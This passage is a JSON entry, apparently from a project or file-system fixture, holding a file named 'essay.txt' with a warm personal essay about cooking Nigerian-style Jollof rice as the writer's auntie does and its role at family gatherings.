        "3": {
          "id": "3",
          "name": "essay.txt",
          "language": "txt",
          "contents": "How to Make Jollof Rice (Just Like My Auntie Does)\n\nOne of my favorite dishes in the world is Jollof rice.\nIt’s a popular West African meal that’s full of flavor, color, and spice. \nEvery country claims their version is the best, but in my opinion, nothing beats my auntie’s Nigerian-style Jollof.\n\nTo make it, you start with rice, tomatoes, onions, and red bell peppers. My auntie blends the tomatoes and peppers into a smooth mix, then cooks it with oil and spices like thyme, curry powder, and bouillon.\nIt smells amazing when it starts bubbling in the pot. Next, she adds the rice and stirs it into the red sauce. \nThe trick, she says, is to cover it with foil so the steam stays in and gives the rice that perfect texture — not too soft, not too hard. \nWhile it’s cooking, she might fry some plantains or grill chicken to go with it.\n\nJollof rice is more than just food. We eat it at birthdays, weddings, and family gatherings. Everyone brings their own twist. \nSome people add shrimp or vegetables, and others keep it classic. \nWhenever I smell Jollof cooking, it reminds me of dancing in the kitchen and laughing with my cousins.\n\nI like that this recipe brings people together. It’s not fancy, but it’s full of love. \n\nOne day, I hope I can make it just as well as my auntie does, but she says the secret ingredient is cooking with joy.",
